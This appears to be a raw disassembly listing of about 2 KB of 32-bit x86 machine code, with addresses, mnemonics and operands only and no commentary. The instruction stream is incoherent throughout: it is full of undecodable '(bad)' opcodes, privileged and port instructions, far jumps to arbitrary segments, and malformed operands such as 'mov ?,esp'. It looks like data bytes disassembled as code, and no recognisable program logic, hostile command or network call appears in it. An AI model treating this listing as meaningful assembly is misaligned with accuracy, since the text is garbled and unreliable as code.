  52011b:	inc    esi
  52011c:	popf   
  52011d:	call   0x1e56c245
  520122:	lea    ebx,[ebx+0x7fb89ac6]
  520128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  520129:	mov    eax,ds:0x8fbd0307
  52012e:	mov    ecx,0xc98945b3
  520133:	into   
  520134:	test   DWORD PTR [ebx],0x8a08c161
  52013a:	repnz nop
  52013c:	iret   
  52013d:	aad    0x89
  52013f:	and    eax,0xd2c33370
  520144:	xchg   ecx,eax
  520145:	mov    dh,dh
  520147:	jnp    0x520166
  520149:	ret    0x6f38
  52014c:	jmp    0x5545:0x4c57fc33
  520153:	jmp    0x9ec1:0x8c24dcf6
  52015a:	cld    
  52015b:	stc    
  52015c:	inc    edx
  52015d:	pushf  
  52015e:	ja     0x52017c
  520160:	dec    esp
  520161:	push   ss
  520162:	nop
  520163:	fimul  WORD PTR [ebx-0x6dc2984c]
  520169:	pop    edi
  52016a:	in     eax,dx
  52016b:	push   ecx
  52016c:	sbb    eax,DWORD PTR [edi]
  52016e:	in     eax,0xbe
  520170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  520171:	mov    bl,0x5e
  520173:	inc    edi
  520174:	test   BYTE PTR [esi+eiz*1-0x1ab18405],bh
  52017b:	pop    edx
  52017c:	mov    cl,0xea
  52017e:	adc    esp,esi
  520180:	jg     0x5201bc
  520182:	inc    ecx
  520183:	enter  0xce14,0x24
  520187:	jo     0x5201d9
  520189:	outs   dx,BYTE PTR ds:[esi]
  52018a:	cmp    edx,DWORD PTR [esi+0x33]
  52018d:	pop    ecx
  52018e:	stos   BYTE PTR es:[edi],al
  52018f:	inc    esi
  520190:	push   0xd72a4efc
  520195:	push   0x5b04d46e
  52019a:	mov    ch,0xd6
  52019c:	mov    eax,0x58a99dff
  5201a1:	pop    ds
  5201a2:	cld    
  5201a3:	loope  0x520153
  5201a5:	aas    
  5201a6:	(bad)  
  5201a8:	loop   0x520176
  5201aa:	jnp    0x520179
  5201ac:	push   ebx
  5201ad:	sub    BYTE PTR [eax+eax*8-0x642876cb],bh
  5201b4:	(bad)  
  5201b6:	mov    ds:0xd2e2df63,eax
  5201bb:	mov    ecx,0x65d8b429
  5201c0:	jecxz  0x5201c3
  5201c2:	jne    0x5201da
  5201c4:	jmp    0x29ee:0xfda2225a
  5201cb:	adc    ah,BYTE PTR [ebx]
  5201cd:	outs   dx,BYTE PTR ds:[esi]
  5201ce:	lock imul ebp,ebp,0x97dce7aa
  5201d5:	cmp    al,0x19
  5201d7:	rcr    ecx,1
  5201d9:	jp     0x520195
  5201db:	(bad)
  5201df:	jnp    0x520165
  5201e1:	sub    DWORD PTR [edi],eax
  5201e3:	xor    eax,0xabe83df1
  5201e8:	jecxz  0x5201f0
  5201ea:	sbb    ch,bl
  5201ec:	mov    al,cl
  5201ee:	mov    cs,edi
  5201f0:	cmp    DWORD PTR [ebx],edi
  5201f2:	sbb    BYTE PTR [ebp+edx*2-0x19],0x97
  5201f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5201f8:	or     edi,esp
  5201fa:	pop    ebx
  5201fb:	fstp   DWORD PTR [ebp+0x52]
  5201fe:	pop    ax
  520200:	push   edx
  520201:	pop    ecx
  520202:	out    dx,eax
  520203:	pop    ebp
  520204:	xor    eax,0xf4550aa7
  520209:	xchg   esp,eax
  52020a:	iret   
  52020b:	cld    
  52020c:	inc    ebx
  52020d:	mov    fs,WORD PTR [ebx+0x34]
  520210:	add    dl,BYTE PTR [edx]
  520212:	jno    0x52019d
  520214:	sub    DWORD PTR [ebp-0x48d45eee],esp
  52021a:	lods   eax,DWORD PTR ds:[esi]
  52021b:	mov    eax,ds:0xdb7fda52
  520220:	cld    
  520221:	push   ebx
  520222:	xchg   DWORD PTR [edi-0x637ab546],edi
  520228:	lds    ecx,FWORD PTR [edi]
  52022a:	rol    edi,1
  52022c:	in     eax,dx
  52022d:	je     0x5202a8
  52022f:	aad    0xe2
  520231:	xchg   esi,eax
  520232:	(bad)  
  520233:	loop   0x520203
  520235:	mov    cl,0x85
  520237:	imul   eax,ebp,0x8a0eae27
  52023d:	(bad)  
  52023f:	mov    ss,WORD PTR [eax+0x6b560138]
  520245:	cld    
  520246:	(bad)  
  520247:	cvtps2pd xmm3,QWORD PTR [ecx]
  52024a:	nop
  52024b:	(bad)
  52024e:	pop    edx
  52024f:	adc    eax,0x4c9a8342
  520254:	jg     0x5202af
  520256:	xor    BYTE PTR [ecx-0x79],ch
  520259:	xchg   ebx,eax
  52025a:	into   
  52025b:	cmp    esp,DWORD PTR [edi]
  52025d:	daa    
  52025e:	fsub   DWORD PTR [ecx]
  520260:	out    dx,al
  520261:	pusha  
  520262:	inc    esp
  520263:	mov    al,0x9
  520265:	lahf   
  520266:	cmp    BYTE PTR [ecx],bl
  520268:	sete   BYTE PTR [edx+eiz*2-0x20e84b2e]
  520270:	add    eax,0x908d8f3c
  520275:	mov    al,ah
  520277:	addr16 mov dh,0x1f
  52027a:	inc    esi
  52027b:	ds sub eax,0xbbdf0eaf
  520281:	into   
  520282:	pop    es
  520283:	jne    0x52028b
  520285:	loop   0x52021d
  520287:	mov    esi,DWORD PTR [ecx+0x5feeef3a]
  52028d:	jmp    0x6984:0x713be41
  520294:	push   ss
  520295:	cmp    BYTE PTR [esi+0x6c],dl
  520298:	cmp    eax,0xcb4a4c6b
  52029d:	lods   al,BYTE PTR ds:[esi]
  52029e:	cmp    al,al
  5202a0:	jns    0x520273
  5202a2:	int3   
  5202a3:	xchg   ebp,eax
  5202a4:	pop    esp
  5202a5:	cmp    cl,dl
  5202a7:	fadd   DWORD PTR [ebx-0x3a]
  5202aa:	adc    bh,ah
  5202ac:	mov    eax,0xed136c3
  5202b1:	les    edi,FWORD PTR [ebx+0x7d]
  5202b4:	cmp    eax,edi
  5202b6:	js     0x520249
  5202b8:	into   
  5202b9:	cdq    
  5202ba:	ins    DWORD PTR es:[edi],dx
  5202bb:	mov    dh,0x67
  5202bd:	mov    WORD PTR [ebp+0x30],ss
  5202c0:	call   0xc0070e13
  5202c5:	mov    ecx,0x9deeb2aa
  5202ca:	or     edi,DWORD PTR [ecx+ebp*8+0x45c05e3c]
  5202d1:	cmp    esi,DWORD PTR [ecx-0x50]
  5202d4:	push   cs
  5202d5:	imul   ebx,DWORD PTR [edi],0x142ba5c4
  5202db:	retf   
  5202dc:	jns    0x520334
  5202de:	mov    DWORD PTR [edx],esp
  5202e0:	inc    edx
  5202e1:	loop   0x52035a
  5202e3:	or     DWORD PTR [edi-0x13bef4ef],edx
  5202e9:	fild   DWORD PTR [edx+eax*1]
  5202ec:	dec    ebp
  5202ed:	call   0x2eef4013
  5202f2:	cdq    
  5202f3:	mov    ch,0x42
  5202f5:	xor    DWORD PTR [esi+0x25],ebx
  5202f8:	sbb    bh,BYTE PTR [ecx+0x6d]
  5202fb:	jno    0x5202cd
  5202fd:	jg     0x520331
  5202ff:	(bad)
  520303:	dec    esp
  520304:	retf   0x1b83
  520307:	sti    
  520308:	mov    ah,0x65
  52030a:	xchg   esi,eax
  52030b:	rcl    BYTE PTR [edi-0x512d2f4f],cl
  520311:	mov    al,0xec
  520313:	rcl    ebx,0x82
  520316:	shl    BYTE PTR [esi+0x19],1
  520319:	ja     0x520378
  52031b:	test   DWORD PTR [edi+0xb6a8f98],ebx
  520321:	dec    ecx
  520322:	int3   
  520323:	push   cs
  520324:	mov    edi,0xb057025d
  520329:	gs inc esi
  52032b:	sbb    al,0xb
  52032d:	sahf   
  52032e:	xor    ebx,DWORD PTR [edi]
  520330:	pop    ebp
  520331:	pop    ebp
  520332:	or     DWORD PTR [edi],ebp
  520334:	jbe    0x52032c
  520336:	outs   dx,BYTE PTR ds:[esi]
  520337:	int    0x3b
  520339:	sub    eax,0xa607d10c
  52033e:	shl    BYTE PTR [ebx+eax*4],0xe7
  520342:	xor    edi,DWORD PTR [ebx]
  520344:	mov    eax,gs
  520346:	pusha  
  520347:	mov    esp,0xa481907f
  52034c:	push   esi
  52034d:	inc    esi
  52034e:	call   0xfc43:0xc99c6a92
  520355:	ror    DWORD PTR [eax-0xa],1
  520358:	cmp    BYTE PTR [edi+edi*8+0x2de37ca4],cl
  52035f:	shr    DWORD PTR [edi+0x51],cl
  520362:	pop    ebp
  520363:	icebp  
  520364:	test   cl,0xab
  520367:	sub    al,0xa9
  520369:	cmp    BYTE PTR [esi],dl
  52036b:	or     al,0xe2
  52036d:	ret    0xac71
  520370:	xchg   ecx,eax
  520371:	jmp    0x520389
  520373:	shl    BYTE PTR fs:[ebp+0x3090a89e],1
  52037a:	push   ecx
  52037b:	sub    eax,0x7f7b7511
  520380:	mov    ebx,0xfc336914
  520385:	sbb    BYTE PTR [ebp-0x59],dh
  520388:	retf   0xbb23
  52038b:	aaa    
  52038c:	leave  
  52038d:	inc    esp
  52038e:	mov    esp,0x383a7761
  520393:	mov    ah,0x15
  520395:	int3   
  520396:	scas   al,BYTE PTR es:[edi]
  520397:	xor    eax,0x86099d75
  52039c:	(bad)  [edi+0x168e9497]
  5203a2:	adc    al,0x58
  5203a4:	mov    dh,0xe3
  5203a6:	ror    BYTE PTR [esi+0x6bcc2f81],0x37
  5203ad:	clc    
  5203ae:	cli    
  5203af:	ror    ecx,0xc3
  5203b2:	push   edi
  5203b3:	loop   0x52038d
  5203b5:	xchg   BYTE PTR [ebx],ah
  5203b7:	dec    ebx
  5203b8:	imul   esp,DWORD PTR [ecx],0x395fb4c5
  5203be:	jo     0x5203b9
  5203c0:	pop    esp
  5203c1:	aas    
  5203c2:	mov    WORD PTR ss:[esi],ss
  5203c5:	aas    
  5203c6:	or     eax,0x1567d0b
  5203cb:	into   
  5203cc:	jns    0x520441
  5203ce:	mov    ds:0x7cb29b86,al
  5203d3:	(bad)  
  5203d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5203d5:	jmp    0xe79f:0xd50a157b
  5203dc:	add    al,0x1a
  5203de:	out    0x3c,eax
  5203e0:	mov    eax,0x672e57d8
  5203e5:	sub    BYTE PTR [esi-0x3f],dl
  5203e8:	inc    ecx
  5203e9:	mov    al,BYTE PTR [ebx]
  5203eb:	loope  0x520453
  5203ed:	cmc    
  5203ee:	jle    0x520376
  5203f0:	std    
  5203f1:	das    
  5203f2:	xor    dh,ch
  5203f4:	mov    WORD PTR [edi],ss
  5203f6:	cwde   
  5203f7:	scas   eax,DWORD PTR es:[edi]
  5203f8:	push   cs
  5203f9:	mov    edx,0x1da6ea38
  5203fe:	(bad)  
  5203ff:	cmp    esp,DWORD PTR [eax-0x6e00b4b0]
  520405:	in     eax,dx
  520406:	(bad)  
  520407:	push   es
  520408:	out    0xac,eax
  52040a:	xchg   ebp,eax
  52040b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52040c:	xchg   ebx,eax
  52040d:	cmp    DWORD PTR [edx+0x10440fdc],0xffffffd3
  520414:	or     DWORD PTR [eax+0x201ec74c],edi
  52041a:	adc    eax,0x57bb40dd
  52041f:	bnd jp 0x52045d
  520422:	(bad)  
  520423:	in     al,0xc4
  520425:	mov    ebx,0xe8742d11
  52042a:	cmp    edx,ebp
  52042c:	sbb    BYTE PTR [edx+0x74],ch
  52042f:	inc    edx
  520430:	push   esp
  520431:	aam    0x48
  520433:	push   ebx
  520434:	cli    
  520435:	idiv   al
  520437:	rcr    DWORD PTR [eax-0x409f0cb2],0xe0
  52043e:	pop    ss
  52043f:	int3   
  520440:	frndint 
  520442:	cmc    
  520443:	xchg   edx,eax
  520444:	push   ds
  520445:	mov    ax,0xc4a1
  520449:	cmp    al,0xdc
  52044b:	xchg   esi,eax
  52044c:	int3   
  52044d:	pusha  
  52044e:	dec    bp
  520450:	lock fmul DWORD PTR [ebp+0x3c9476db]
  520457:	or     edx,DWORD PTR [eax]
  520459:	loopne 0x5204be
  52045b:	jmp    0xbc3842b2
  520460:	pop    ebp
  520461:	mov    DWORD PTR [edi],edi
  520463:	mov    eax,ds:0xe92db3a4
  520468:	inc    edi
  520469:	and    BYTE PTR [ecx+eax*8+0xf],ch
  52046d:	xor    eax,0x40fb7de8
  520472:	stos   DWORD PTR es:[edi],eax
  520473:	add    BYTE PTR [esi+0x1e],dl
  520476:	jmp    DWORD PTR [esp+ebp*1-0x659ba554]
  52047d:	pop    esp
  52047e:	sbb    BYTE PTR [ebx-0x40c9c017],0x7
  520485:	add    al,0xa
  520487:	ss cmp al,0x85
  52048a:	pop    edx
  52048b:	or     edi,edi
  52048d:	jne    0x520436
  52048f:	and    bl,BYTE PTR [edx+edi*2+0x56457d34]
  520496:	lahf   
  520497:	hlt    
  520498:	xor    ah,BYTE PTR [eax-0x5a781890]
  52049e:	cwde   
  52049f:	dec    ebx
  5204a0:	jge    0x52050c
  5204a2:	loopne 0x5204bd
  5204a4:	das    
  5204a5:	hlt    
  5204a6:	lock xor eax,0x7fd649ae
  5204ac:	js     0x5204a7
  5204ae:	add    edx,ecx
  5204b0:	pop    ds
  5204b1:	sbb    al,0x5d
  5204b3:	sub    esp,DWORD PTR [edi+0x425f1071]
  5204b9:	jecxz  0x520489
  5204bb:	push   esp
  5204bc:	add    BYTE PTR [ebp+0x3e9e3e39],ah
  5204c2:	hlt    
  5204c3:	pop    esi
  5204c4:	jo     0x5204e8
  5204c6:	add    ah,BYTE PTR [eax-0x67]
  5204c9:	repnz outs dx,BYTE PTR ds:[esi]
  5204cb:	sub    bh,bh
  5204cd:	(bad)  
  5204ce:	mov    esp,0x36e7951a
  5204d3:	push   ebp
  5204d4:	sbb    ch,BYTE PTR [esi]
  5204d6:	daa    
  5204d7:	arpl   WORD PTR [esi],ax
  5204d9:	inc    esp
  5204da:	add    edx,esp
  5204dc:	in     eax,dx
  5204dd:	fidiv  WORD PTR ds:0x2839b5c0
  5204e3:	xor    BYTE PTR [edx-0x66],ah
  5204e6:	xor    BYTE PTR [ebx-0x3c8dc72f],0x1f
  5204ed:	sti    
  5204ee:	adc    eax,0xfaee1d16
  5204f3:	sub    eax,0x154d4e1d
  5204f8:	sbb    ch,cl
  5204fa:	es jl  0x5204f3
  5204fd:	out    dx,eax
  5204fe:	mov    al,ds:0x8fd8e6a1
  520503:	push   0xffffffc0
  520505:	pop    ebp
  520506:	mov    bl,ah
  520508:	mov    bh,0x99
  52050a:	dec    esp
  52050b:	and    DWORD PTR [edi],eax
  52050d:	(bad)  [eax]
  52050f:	lds    edx,FWORD PTR [ebx]
  520511:	adc    eax,DWORD PTR [ecx]
  520513:	in     al,0x6b
  520515:	xor    esi,ecx
  520517:	scas   al,BYTE PTR es:[edi]
  520518:	loopne 0x52050e
  52051a:	and    DWORD PTR [eax],ebx
  52051c:	aam    0xa8
  52051e:	data16 xor cl,BYTE PTR [ecx-0x1f]
  520522:	dec    esi
  520523:	outs   dx,BYTE PTR ds:[esi]
  520524:	cli    
  520525:	fcmove st,st(4)
  520527:	xchg   esp,eax
  520528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  520529:	mov    eax,0xba06b2c6
  52052e:	jle    0x5204cc
  520530:	enter  0xde31,0xa3
  520534:	sbb    ax,0x56d1
  520538:	adc    edi,DWORD PTR [eax]
  52053a:	sub    ebp,DWORD PTR [ecx]
  52053c:	mov    ss,WORD PTR [ebx]
  52053e:	jne    0x5204cd
  520540:	lock lods eax,DWORD PTR ds:[esi]
  520542:	mov    bl,0xae
  520544:	add    DWORD PTR [eax+0x22],edi
  520547:	jae    0x5205a3
  520549:	xor    eax,0x84c5581f
  52054e:	xor    DWORD PTR [edi],esp
  520550:	mov    edi,0xafb06a65
  520555:	inc    ebp
  520556:	xlat   BYTE PTR ds:[ebx]
  520557:	mov    bl,0x40
  520559:	adc    bl,0xff
  52055c:	pusha  
  52055d:	ss fcomp st(2)
  520560:	cmp    ebp,edx
  520562:	sbb    ebx,edi
  520564:	repz jmp 0x8f76a8fe
  52056a:	mov    ds:0xdabab91d,al
  52056f:	inc    ecx
  520570:	sub    al,0x2b
  520572:	jp     0x520570
  520574:	cmp    esi,ebx
  520576:	gs mov ebx,0x8e6611f8
  52057c:	mov    BYTE PTR [edi-0x4c],al
  52057f:	jb     0x5205e5
  520581:	mov    dh,ah
  520583:	pop    esp
  520584:	and    BYTE PTR [edi],al
  520586:	jecxz  0x5205b6
  520588:	ret    
  520589:	mov    eax,0x395ab0ed
  52058e:	push   edi
  52058f:	push   cs
  520590:	rol    BYTE PTR [esi],cl
  520592:	out    0x44,al
  520594:	aad    0xb1
  520596:	xor    esi,DWORD PTR [eax+0x526664fa]
  52059c:	das    
  52059d:	push   ds
  52059e:	out    0xa4,al
  5205a0:	call   0xfe78b44c
  5205a5:	aam    0x78
  5205a7:	dec    esi
  5205a8:	pop    ecx
  5205a9:	xchg   edx,eax
  5205aa:	push   ebp
  5205ab:	pop    ecx
  5205ac:	fdiv   QWORD PTR [edi+edx*4-0x67]
  5205b0:	add    ch,BYTE PTR [ecx]
  5205b2:	mov    ds:0x336d9089,eax
  5205b7:	mov    esi,0x8f5407a3
  5205bc:	lods   al,BYTE PTR ds:[esi]
  5205bd:	dec    esp
  5205be:	mov    ds:0xfd0eb261,eax
  5205c3:	mov    bh,0xd9
  5205c5:	es push ds
  5205c7:	mov    dl,0xd
  5205c9:	push   ss
  5205ca:	mov    dl,BYTE PTR cs:[ecx]
  5205cd:	(bad)  
  5205ce:	xlat   BYTE PTR ds:[ebx]
  5205cf:	pavgw  mm3,QWORD PTR [edx-0x48]
  5205d3:	icebp  
  5205d4:	inc    ecx
  5205d5:	stc    
  5205d6:	cmp    esi,ebx
  5205d8:	jl     0x5205c9
  5205da:	cmp    BYTE PTR [eax],0xb0
  5205dd:	mov    ch,0x1e
  5205df:	call   0x892:0x43932e6e
  5205e6:	push   cs
  5205e7:	dec    ebx
  5205e8:	push   edx
  5205e9:	mov    eax,DWORD PTR [ebx-0x32f776dd]
  5205ef:	arpl   WORD PTR [eax+0x55],bp
  5205f2:	std    
  5205f3:	rol    BYTE PTR [edx-0x40894a9a],1
  5205f9:	jp     0x52063a
  5205fb:	pop    edi
  5205fc:	xchg   ebx,eax
  5205fd:	dec    edi
  5205fe:	pop    esi
  5205ff:	(bad)  
  520601:	mov    BYTE PTR [edx-0x80],0xbb
  520605:	adc    bl,BYTE PTR [edi+0x6560604a]
  52060b:	out    dx,al
  52060c:	ja     0x52059e
  52060e:	scas   eax,DWORD PTR es:[edi]
  52060f:	xchg   ecx,eax
  520610:	push   ds
  520611:	shl    esi,cl
  520613:	addr16 aaa 
  520615:	hlt    
  520616:	pop    esp
  520617:	arpl   WORD PTR [ebp+0x7c2c544a],ax
  52061d:	jge    0x520662
  52061f:	fadd   QWORD PTR [ebx-0x28]
  520622:	sub    ah,BYTE PTR [ebx+0x25ac6428]
  520628:	adc    DWORD PTR [eax],ebx
  52062a:	mov    esi,0xde5a9b82
  52062f:	fs ret 
  520631:	xchg   esp,eax
  520632:	cld    
  520633:	retf   0xa04b
  520636:	jno    0x5206a7
  520638:	cli    
  520639:	jne    0x520689
  52063b:	push   edi
  52063c:	push   edx
  52063d:	fwait
  52063e:	jmp    0x6da1:0xf1fb7b56
  520645:	cld    
  520646:	sub    eax,0x34f16096
  52064b:	inc    ebp
  52064c:	and    eax,DWORD PTR [edi+0x5e]
  52064f:	add    eax,0x73a72e20
  520654:	add    dh,0x3
  520657:	mov    edi,0xb65b1210
  52065c:	mov    ?,WORD PTR [edi+0x46]
  52065f:	pop    ebx
  520660:	and    al,BYTE PTR [eax]
  520662:	jne    0x52066b
  520664:	xchg   esi,eax
  520665:	jmp    DWORD PTR [edx-0x10106d0d]
  52066b:	stc    
  52066c:	call   0x131b4e1e
  520671:	push   ecx
  520672:	mov    bl,0x17
  520674:	ds mov dl,0xe7
  520677:	adc    dl,BYTE PTR [ebx]
  520679:	mov    eax,0x1747793
  52067e:	int    0xce
  520680:	in     eax,0xf0
  520682:	outs   dx,BYTE PTR ds:[esi]
  520683:	jnp    0x52069a
  520685:	push   ecx
  520686:	punpcklwd mm4,DWORD PTR [ebx]
  520689:	sbb    DWORD PTR [edi+0x416a197],edi
  52068f:	cmp    BYTE PTR [ebx-0x6e4a90c],0x1c
  520696:	jno    0x52066d
  520698:	jnp    0x520697
  52069a:	push   cs
  52069b:	sbb    eax,0x80ae76b7
  5206a0:	adc    edi,DWORD PTR [esi]
  5206a2:	call   0xa0dd2532
  5206a7:	jl     0x52068f
  5206a9:	jge    0x52067e
  5206ab:	aad    0x9a
  5206ad:	scas   al,BYTE PTR es:[edi]
  5206ae:	jp     0x5206ba
  5206b0:	(bad)  
  5206b1:	cmc    
  5206b2:	mov    ch,0xe0
  5206b4:	cmovl  esp,esi
  5206b7:	rcr    ah,1
  5206b9:	popf   
  5206ba:	sbb    al,0xa1
  5206bc:	mov    ds:0x5417d36c,al
  5206c1:	mov    BYTE PTR [edi-0x14b01259],bl
  5206c7:	pop    esi
  5206c8:	fucomp st(7)
  5206ca:	jb     0x520710
  5206cc:	xor    eax,0x2b0d54a9
  5206d1:	mov    eax,ds:0x232fe980
  5206d6:	iret   
  5206d7:	test   ebx,0x6ab250ec
  5206dd:	xor    al,0xfe
  5206df:	sbb    al,ch
  5206e1:	pop    ebp
  5206e2:	and    BYTE PTR [edi-0x1c],cl
  5206e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5206e6:	jne    0x52069b
  5206e8:	jno    0x52068a
  5206ea:	test   DWORD PTR ds:0x4ce648c9,0x644dc34b
  5206f4:	inc    ebp
  5206f5:	mov    ds:0x6c0e75ee,eax
  5206fa:	xchg   DWORD PTR [ecx+0xe],ebp
  5206fd:	lods   eax,DWORD PTR ds:[esi]
  5206fe:	aas    
  5206ff:	loope  0x52073e
  520701:	and    BYTE PTR [edi],cl
  520703:	aam    0x57
  520705:	sbb    ch,ah
  520707:	fist   WORD PTR [edx-0x4bb579d2]
  52070d:	or     edi,eax
  52070f:	jl     0x52073c
  520711:	and    BYTE PTR [edx+0x58],bh
  520714:	rcr    BYTE PTR [edi-0x39b7e418],cl
  52071a:	xchg   esi,eax
  52071b:	ss inc esi
  52071d:	mov    dh,0xda
  52071f:	push   ds
  520720:	xor    BYTE PTR [ecx+0x3e],bl
  520723:	adc    ebx,DWORD PTR [edx+0x4eedc39d]
  520729:	fsub   st,st(5)
  52072b:	mov    esi,0x4327c8db
  520730:	mov    edi,DWORD PTR [esi-0x652bad42]
  520736:	mov    esp,0x4de771a3
  52073b:	xchg   BYTE PTR [eax],ch
  52073d:	mov    DWORD PTR [edi-0x7a679631],ebx
  520743:	sbb    BYTE PTR [eax],0x2d
  520746:	and    al,0x9b
  520748:	pushf  
  520749:	inc    edx
  52074a:	add    al,0x5b
  52074c:	arpl   WORD PTR [edi+ebp*2],dx
  52074f:	adc    ch,BYTE PTR [edi]
  520751:	push   0xadcf1582
  520756:	gs sbb ch,ah
  520759:	add    al,0x1d
  52075b:	sub    esi,DWORD PTR [esi-0x4a92d13d]
  520761:	inc    eax
  520762:	or     DWORD PTR [esi+0x56],ecx
  520765:	sti    
  520766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  520767:	(bad)
  52076c:	pop    esp
  52076d:	push   es
  52076e:	mov    ds:0x5cc85d21,eax
  520773:	stc    
  520774:	dec    esp
  520775:	ror    BYTE PTR [edx+esi*4-0x2e],cl
  520779:	in     eax,dx
  52077a:	stc    
  52077b:	test   eax,0x4de6a563
  520780:	into   
  520781:	push   es
  520782:	pop    ebx
  520783:	lock cli 
  520785:	ins    BYTE PTR es:[edi],dx
  520786:	call   ebp
  520788:	mov    ebx,0x172a7896
  52078d:	leave  
  52078e:	xor    esp,DWORD PTR [edx+0x63af7a11]
  520794:	mov    ebp,ebx
  520796:	xchg   ebp,eax
  520797:	je     0x520747
  520799:	adc    al,0x48
  52079b:	adc    cl,bh
  52079d:	dec    esp
  52079e:	cwde   
  52079f:	div    BYTE PTR [esi]
  5207a1:	ror    edi,1
  5207a3:	enter  0x4fb,0xf
  5207a7:	mov    bh,0x25
  5207a9:	enter  0x1466,0xdd
  5207ad:	mov    esp,0xa8eda33e
  5207b2:	and    al,0x12
  5207b4:	cmp    eax,0x58c59256
  5207b9:	shl    DWORD PTR [esi],1
  5207bb:	(bad)  
  5207bc:	lods   eax,DWORD PTR ds:[esi]
  5207bd:	test   al,0xf
  5207bf:	(bad)
  5207c4:	pop    esp
  5207c5:	call   0xb6f6dcef
  5207ca:	mov    bl,0x41
  5207cc:	pop    es
  5207cd:	ss dec edi
  5207cf:	cmp    al,0xfd
  5207d1:	fld    TBYTE PTR [eax-0x14]
  5207d4:	push   ds
  5207d5:	ficomp DWORD PTR [ecx]
  5207d7:	inc    ebx
  5207d8:	xchg   BYTE PTR [edi+ebx*8+0x61],al
  5207dc:	test   BYTE PTR [eax],0x9a
  5207df:	fbld   TBYTE PTR [esi]
  5207e1:	jp     0x520801
  5207e3:	push   edi
  5207e4:	jno    0x52084a
  5207e6:	out    0xe5,eax
  5207e8:	adc    eax,0x8fbb859a
  5207ed:	push   eax
  5207ee:	inc    ebp
  5207ef:	ss (bad) 
  5207f1:	jb     0x520821
  5207f3:	push   edi
  5207f4:	pop    esi
  5207f5:	push   esp
  5207f6:	or     edx,DWORD PTR [ecx]
  5207f8:	lods   eax,DWORD PTR ds:[esi]
  5207f9:	sub    BYTE PTR [edi],ch
  5207fb:	outs   dx,BYTE PTR ds:[esi]
  5207fc:	stos   DWORD PTR es:[edi],eax
  5207fd:	scas   al,BYTE PTR es:[edi]
  5207fe:	test   eax,0x74e20b68
  520803:	stos   BYTE PTR es:[edi],al
  520804:	push   0xc33fc574
  520809:	in     eax,0xeb
  52080b:	sub    DWORD PTR [eax+0x580b1ffd],0x7aa08541
  520815:	mov    ebp,DWORD PTR [ecx]
  520817:	sbb    DWORD PTR [ebx-0x44],edx
  52081a:	cwde   
  52081b:	fsubr  st,st(6)
  52081d:	cmp    eax,0x2d01fca7
  520822:	xchg   BYTE PTR [edx-0x15],cl
  520825:	lock mov esi,0x6e7e3ce7
  52082b:	or     edx,DWORD PTR [ebx+0x3b504931]
  520831:	int3   
  520832:	dec    edi
  520833:	dec    eax
  520834:	mov    DWORD PTR [ebp-0x42],ebx
  520837:	scas   al,BYTE PTR es:[edi]
  520838:	adc    cl,bh
  52083a:	fwait
  52083b:	jne    0x520878
  52083d:	stos   BYTE PTR es:[edi],al
  52083e:	sub    al,BYTE PTR [eax]
  520840:	jne    0x52080c
  520842:	inc    eax
  520843:	nop    esi
  520846:	jecxz  0x5207fc
  520848:	cdq    
  520849:	xor    al,0x7e
  52084b:	cdq    
  52084c:	or     cl,ch
  52084e:	mov    WORD PTR [edx],?
  520850:	xchg   BYTE PTR ds:0xd200d4cc,dh
  520856:	ss push edi
  520858:	js     0x5207e1
  52085a:	jbe    0x520877
  52085c:	pop    ebp
  52085d:	je     0x5208ba
  52085f:	sub    eax,0x18589d5
  520864:	imul   eax,DWORD PTR [esi+eiz*8-0x3f],0x106f776a
  52086c:	ins    BYTE PTR es:[edi],dx
  52086d:	add    ebp,DWORD PTR gs:[edx]
  520870:	xchg   edx,eax
  520871:	push   0x13
  520873:	js     0x52083b
  520875:	fwait
  520876:	js     0x520845
  520878:	sbb    edx,edi
  52087a:	push   ebx
  52087b:	jmp    0xd8014b12
  520880:	inc    eax
  520881:	mov    cl,0x8
  520883:	dec    edi
  520884:	das    
  520885:	adc    DWORD PTR [eax-0x72],esp
  520888:	add    DWORD PTR [esi-0x36],0xffffffee
  52088c:	in     eax,dx
  52088d:	and    al,0x14
  52088f:	sbb    BYTE PTR [ecx+eiz*4],cl
  520892:	push   ecx
  520893:	adc    eax,0x64363344
  520898:	in     eax,dx
  520899:	and    edi,eax
  52089b:	xor    edx,DWORD PTR [eax-0x3f]
  52089e:	loopne 0x520822
  5208a0:	or     al,0x28
  5208a2:	inc    esi
  5208a3:	xor    al,0xc4
  5208a5:	loop   0x52086d
  5208a7:	jmp    0xa3d95212
  5208ac:	jb     0x520918
  5208ae:	dec    esi
  5208af:	adc    esp,DWORD PTR [edx-0x712aa7e1]
  5208b5:	mov    ebx,0x963cc4b2
  5208ba:	push   0xf16a7a5a
  5208bf:	adc    ch,BYTE PTR [ebp-0x79]
  5208c2:	hlt    
  5208c3:	outs   dx,DWORD PTR ds:[esi]
  5208c4:	pop    fs
  5208c6:	jno    0x5208e2
  5208c8:	sbb    al,0x32
  5208ca:	and    eax,0x45bdb25c
  5208cf:	ror    BYTE PTR [esi-0x36],cl
  5208d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5208d3:	mov    al,0x53
  5208d5:	add    BYTE PTR [ebp+0x41],0x9
  5208d9:	loope  0x520935
  5208db:	xchg   edx,edi
  5208dd:	ret    0x53c2
  5208e0:	sub    ah,dl
  5208e2:	jmp    0x52092a
  5208e4:	jecxz  0x520913
  5208e6:	loopne 0x520904
  5208e8:	aad    0x58
  5208ea:	inc    edi
  5208eb:	pusha  
  5208ec:	mov    ebp,esi
  5208ee:	(bad)  
  5208ef:	jmp    0x520945
  5208f1:	sub    al,0x3a
  5208f3:	mov    eax,0x9e97d2cc
  5208f8:	xlat   BYTE PTR ds:[ebx]
  5208f9:	pop    edx
  5208fa:	test   ah,0x2d
  5208fd:	test   eax,0x5150ef5b
  520902:	mov    ?,esp
  520904:	loopne 0x5208c1
  520906:	jo     0x520978
  520908:	and    esi,DWORD PTR [edx]
  52090a:	add    al,0x73
  52090d:	mov    ah,ch
  52090f:	mov    ds:0x1341aa60,eax
  520914:	in     al,dx
  520915:	push   0xdb387e3b
  52091a:	cld    
  52091b:	jp     0x520995
  52091d:	sub    eax,0xce770052
